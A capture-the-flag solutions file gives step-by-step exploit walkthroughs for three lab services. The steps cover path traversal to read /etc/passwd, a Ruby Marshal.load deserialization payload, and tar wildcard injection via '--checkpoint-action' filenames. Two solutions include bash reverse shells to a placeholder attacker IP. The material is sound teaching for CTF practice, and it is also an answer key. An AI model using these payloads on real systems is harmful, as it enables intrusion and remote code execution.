# Solutions - intended exploit walkthroughs

Spoilers :)

---

## burrow1 - Burrow Library (path traversal / LFI, Easy)

TLDR: Unsanitized query param that returns the output of any file

**Steps**

1. Browse to `http://<host>:8001/`. Note documents are served from
   `/view?file=<name>`.
2. Confirm the parameter is a raw path by escaping the docs directory, e.g.
   read `/etc/passwd`:

   ```bash
   curl 'http://<host>:8001/view?file=../../../../etc/passwd'
   ```

3. Read the flag directly (traversal or an absolute path both work):

   ```bash
   curl 'http://<host>:8001/view?file=../../../../home/burrow/flag.txt'
   # or
   curl 'http://<host>:8001/view?file=/home/burrow/flag.txt'
   ```

---

## burrow2 - Warren Lounge (insecure deserialization / Ruby `Marshal.load` RCE, Medium)

TLDR: `Marshal.load` is inherently a vulnerable function. We can inject RCE into the `prefs`
cookie by using the code at `/debug/source` as reference

**Steps**

1. Browse to `http://<host>:8002/`. You'll be presented with a preferences page that
   sets a base64 `prefs` cookie. Note the hint toward `/debug/source`.
2. Read the exposed source:

   ```bash
   curl 'http://<host>:8002/debug/source'
   ```

   You should see a few lines of code that run `Marshal.load` on the attacker-controlled
   `prefs` cookie and the `marshal_load` hook that runs `state[:hook]`.

3. Build a malicious `prefs` blob

   ```ruby
   # payload.rb
   require 'base64'
   class Preferences
     def marshal_dump
       { theme: 'dark', motd: 'pwned',
         hook: "bash -c 'bash -i >& /dev/tcp/<ATTACKER-IP>/4444 0>&1'" }
     end
   end
   puts Base64.strict_encode64(Marshal.dump(Preferences.new))
   ```

   ```bash
   ruby payload.rb    # prints the base64 prefs blob
   ```

4. Start a listener, then send the blob as the `prefs` cookie:

   ```bash
   nc -lvnp 4444
   curl -b "prefs=<base64-blob>" 'http://<host>:8002/'
   ```

5. Catch the shell (it runs as `burrow`) and read the flag!

   ```bash
   cat /home/burrow/flag.txt
   ```

**Note**: It's obviously possible to do this without a reverse shell, but where's the fun in that :P

---

## burrow3 - Burrow Backup (tar wildcard injection, Hard)

TLDR: The "Back up my uploads" button runs `tar czf ... *` in the upload dir.
GNU tar treats option-looking filenames as options, so an uploaded file named
`--checkpoint-action=exec=sh x.sh` makes tar execute a script we also uploaded -
RCE as `burrow`.

There are _two_ valid ways to solve this CTF. The first involves a reverse shell
and the second is placing the flag in the upload directory, which will then
get included in the downloadable backup tarball.

**Steps**

1. Browse to `http://<host>:8003/`. Note the upload form and the "Back up my
   uploads" button. Uploaded files should be listed here.

2. Write a payload script `x.sh`. Two possible solutions here:

   ```bash
   # Path A (reverse shell)
   echo "bash -c 'bash -i >& /dev/tcp/<ATTACKER-IP>/4444 0>&1'" > x.sh

   # Path B (no listener): copy the flag where the next backup will archive it
   echo 'cp /home/burrow/flag.txt /app/uploads/big-loot.txt' > x.sh
   ```

3. Upload three files - the script, and the two tar-option filenames (the empty
   files just need to _exist_ under those names):

   ```bash
   curl -F 'f=@x.sh;filename=x.sh'                                   http://<host>:8003/upload
   curl -F 'f=@/dev/null;filename=--checkpoint=1'                    http://<host>:8003/upload
   curl -F 'f=@/dev/null;filename=--checkpoint-action=exec=sh x.sh'  http://<host>:8003/upload
   ```

   This sets up the following command to be run when the backup is triggered:

   ```bash
   tar czf /app/backups/backup.tgz --checkpoint-action=exec=sh x.sh --checkpoint=1 x.sh # and whatever other files you may have uploaded are appended
   ```

   > **NOTE**: If you paste exact command into the terminal, the shell will split the arguments on spaces
   > which will result in the `checkpoint-action` argument getting split into two arguments. The whole
   > reason why this actually works is because glob expansion does not undergo word splitting, so the
   > argument is passed, space and all, to tar. This is the heart of the exploit. Pretty neat!

4. Trigger the backup. tar globs the upload dir, hits the checkpoint options, and
   runs `sh x.sh` as `burrow`:

   ```bash
   curl -X POST http://<host>:8003/backup
   ```

   - **Path A:** have `nc -lvnp 4444` ready first; catch the shell and
     `cat /home/burrow/flag.txt`. Done.
   - **Path B:** the flag is now at `/app/uploads/big-loot.txt`. Run the backup once
     more so it gets archived, then download and extract:

     ```bash
     curl -X POST http://<host>:8003/backup      # re-archive, now includes big-loot.txt
     curl -s http://<host>:8003/download -o out.tgz
     tar xf out.tgz -O big-loot.txt                 # the flag
     ```
